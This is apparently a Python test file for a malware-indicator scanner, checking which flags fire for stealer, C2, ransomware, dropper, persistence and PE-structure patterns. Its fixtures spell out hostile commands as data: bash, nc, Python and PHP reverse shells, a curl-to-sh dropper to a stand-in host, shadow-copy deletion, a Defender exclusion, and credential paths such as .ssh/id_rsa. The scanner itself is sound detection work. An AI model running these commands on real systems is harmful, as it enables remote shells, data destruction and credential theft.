#!/usr/bin/env python3
"""Tests wq_indicators.py: stealer / C2 / ransomware / dropper strings (ASCII and UTF-16) and PE structure flags."""
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import wq_indicators as I

D = tempfile.mkdtemp()
u16 = lambda s: s.encode("utf-16le")


def scan(data, **kw):
    I.reset_budget()
    p = os.path.join(D, "f%d" % len(os.listdir(D)))
    Path(p).write_bytes(data)
    return I.scan_file(p, len(data), **kw)


def eq(name, got, want):
    assert got == want, f"FAIL {name}: expected {want!r}, got {got!r}"
    print("ok  ", name)


eq("discord webhook (ascii)", scan(b"x" * 50 + b"https://discord.com/api/webhooks/123/abc")[0], {"c2_service": ["discord_webhook"]})
eq("telegram bot api inside .NET-style UTF-16", scan(os.urandom(2048) + u16("https://api.telegram.org/bot1:A/sendMessage"))[0],
   {"c2_service": ["telegram_bot"]})
eq("upper-case is matched too", scan(b"HTTPS://API.TELEGRAM.ORG/BOT1:A")[0], {"c2_service": ["telegram_bot"]})
eq("onion address", scan(b"http://" + b"a2b3c4d5e6f7g2h3" + b".onion/")[0], {"c2_service": ["tor_hidden_service"]})
eq("a game that only says discord is clean", scan(b"Discord Rich Presence, https://discord.com/invite/abc")[0], {})
eq("ngrok needs a real host name", scan(b"ngrok is a tunnelling tool")[0], {})
eq("one stealer family is not enough", scan(u16("Google\\Chrome\\User Data"))[0], {})
eq("two stealer families fire", scan(u16("Google\\Chrome\\User Data") + b"\0" + u16("os_crypt"))[0],
   {"stealer": ["chromium_masterkey", "chromium_profile"]})
eq("dpapi + wallet fire", sorted(scan(b"CryptUnprotectData\0wallet.dat")[0]["stealer"]), ["crypto_wallet", "dpapi"])
eq("vssadmin alone is ransomware-grade", scan(b"cmd /c vssadmin delete shadows /all /quiet")[0], {"ransom": ["shadow_delete"]})
eq("a single weak ransom word is nothing", scan(b"accepts bitcoin payments")[0], {})
eq("two weak ransom words fire", sorted(scan(b"send bitcoin; this is a ransom note")[0].get("ransom", [])), ["payment_word", "ransom_word"])
eq("encoded powershell", list(scan(b"powershell.exe -NoP -w hidden -c iex")[0]), ["lolbin"])
eq("plain powershell is fine", scan(b"powershell Get-Process")[0], {})
eq("defender exclusion", list(scan(u16("Add-MpPreference -ExclusionPath C:\\"))[0]), ["lolbin"])
eq("run key", scan(b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0")[0], {"persist": ["run_key"]})
eq("RunServices-like names are not a Run key", scan(b"CurrentVersion\\Runtime")[0], {})
eq("anti-analysis needs two families", scan(b"VBoxService")[0], {})
eq("anti-analysis with two families", sorted(scan(b"VBoxService wine_get_version")[0]["anti_analysis"]), ["vm_check", "wine_check"])
eq("one weak RAT word is nothing", scan(b"this game has a keylogger-proof on-screen keyboard")[0], {})
eq("two weak RAT words fire", sorted(scan(b"keylogger hvnc")[0]["rat_words"]), ["hvnc", "keylogger"])
eq("'reverse shell' in plain words is blunt enough to fire alone", scan(b"keylogger reverse shell")[0].get("payload_desc"), ["reverse_shell"])
eq("meterpreter alone", list(scan(b"stage: meterpreter")[0]), ["payload_desc"])
eq("mining pool url alone", scan(b"stratum+tcp://pool.example:3333")[0], {"payload_desc": ["miner"]})
eq("'this payload steals' is a self-description", list(scan(b"This payload steals browser passwords.")[0]), ["payload_desc"])
eq("an ordinary use of the word payload is fine", scan(b"the payload of the cargo ship is 20 tons; HTTP payload size")[0], {})
# --- Linux code patterns
eq("bash /dev/tcp reverse shell", list(scan(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")[0]), ["revshell"])
eq("nc -e", list(scan(b"nc 10.0.0.1 4444 -e /bin/sh")[0]), ["revshell"])
eq("mkfifo + nc", list(scan(b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f")[0]), ["revshell"])
eq("python socket + dup2", list(scan(b"s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);pty.spawn('sh')")[0]), ["revshell"])
eq("php fsockopen + proc_open", list(scan(b"<?php $s=fsockopen('h',4444);$p=proc_open('/bin/sh -i',array($s,$s,$s),$x);")[0]), ["revshell"])
eq("a plain socket client is fine", scan(b"import socket\ns=socket.socket()\ns.connect(('example.org',80))\ns.send(b'GET /')")[0], {})
eq("curl piped into sh", list(scan(b"curl -fsSL http://x.example/i.sh | sh")[0]), ["linux_dropper"])
eq("curl without a pipe into a shell is fine", scan(b"curl -fsSL http://x.example/i.sh -o i.sh")[0], {})
eq("base64 -d into sh", list(scan(b"echo aGk= | base64 -d | sh")[0]), ["linux_dropper"])
eq("exec(b64decode())", list(scan(b"exec(base64.b64decode('aGk='))")[0]), ["linux_dropper"])
eq("literal_eval of base64 is fine", scan(b"literal_eval(base64_decodebytes(label.encode('ascii')))")[0], {})
eq("append to .bashrc", list(scan(b"echo 'x' >> ~/.bashrc")[0]), ["linux_persist"])
eq("reading .bashrc is fine", scan(b"cat ~/.bashrc")[0], {})
eq("crontab install", list(scan(b'(crontab -l; echo "* * * * * /tmp/x") | crontab -')[0]), ["linux_persist"])
eq("two Linux stealer families", list(scan(b".config/google-chrome .ssh/id_rsa")[0]), ["stealer"])
eq("one Linux stealer family alone is fine", scan(b".config/google-chrome")[0], {})
eq("string split over a chunk boundary is found",
   scan(os.urandom(I.CHUNK - 10) + b"api.telegram.org/bot12")[0], {"c2_service": ["telegram_bot"]})
mz = b"MZ" + b"\0" * 0x3a + (0x40).to_bytes(4, "little") + b"PE\0\0" + b"\0" * 20
eq("a PE inside a PE is counted (the outer header is not)", scan(mz + os.urandom(100) + mz, want_embedded=True)[1], 1)
eq("embedded is off unless asked", scan(mz + os.urandom(100) + mz)[1], 0)
eq("empty file", scan(b"")[0], {})
eq("missing file", I.scan_file(os.path.join(D, "nope"), 10), ({}, 0))

# large file: only head and tail are read, and the budget stops runaway scans
old = I.PER_FILE_MAX
I.PER_FILE_MAX = 1 << 20
big = b"A" * (4 << 20)
mid = len(big) // 2
big = big[:mid] + b"api.telegram.org/bot12" + big[mid:]
eq("middle of an oversized file is not read", scan(big)[0], {})
big2 = b"api.telegram.org/bot12" + b"A" * (4 << 20)
eq("start of an oversized file is read", scan(big2)[0], {"c2_service": ["telegram_bot"]})
I.PER_FILE_MAX = old
I.reset_budget()
I._budget["left"] = 0
Path(D, "late").write_bytes(b"api.telegram.org/bot12")
eq("budget exhausted: later files are not scanned", I.scan_file(os.path.join(D, "late"), 22), ({}, 0))
I.reset_budget()

# PE structure
S = lambda name, vs, va, rs, fl: (name, vs, va, rs, 0, fl)
RX, RW, RWX, CODE = 0x40000040, 0xC0000040, 0xE0000020, 0x60000020
eq("clean layout", I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE), S(".data", 4096, 8192, 4096, RW)], 4100, {"createfilea"}, False, 1 << 20), {})
eq("w+x section", list(I.pe_structure_flags([S(".text", 4096, 4096, 4096, RWX)], 4100, set(), False, 100)), ["pe_wx_section"])
eq("empty-on-disk code section", "pe_unpack_stub" in I.pe_structure_flags([S("x", 1 << 20, 4096, 0, CODE), S("y", 4096, 4096 + (1 << 20), 4096, RW)], 4100, set(), False, 100), True)
eq(".bss is not an unpack stub", "pe_unpack_stub" in I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE), S(".bss", 1 << 20, 8192, 0, RW)], 4100, set(), False, 100), False)
eq("entry in a data section", list(I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE), S(".data", 4096, 8192, 4096, RW)], 8200, set(), False, 100)), ["pe_odd_entry"])
eq("entry outside every section", list(I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE)], 99999, set(), False, 100)), ["pe_odd_entry"])
eq("entry 0 (a DLL without one) is fine", I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE)], 0, set(), False, 100), {})
eq("thin imports", list(I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE)], 4100, {"loadlibrarya", "getprocaddress"}, False, 1 << 20)), ["pe_thin_imports"])
eq("thin imports ignore .NET and tiny files", I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE)], 4100, {"loadlibrarya"}, True, 1 << 20), {})
eq("thin imports need only loader functions", I.pe_structure_flags([S(".text", 4096, 4096, 4096, CODE)], 4100, {"loadlibrarya", "createfilea"}, False, 1 << 20), {})
print("indicators: ok")
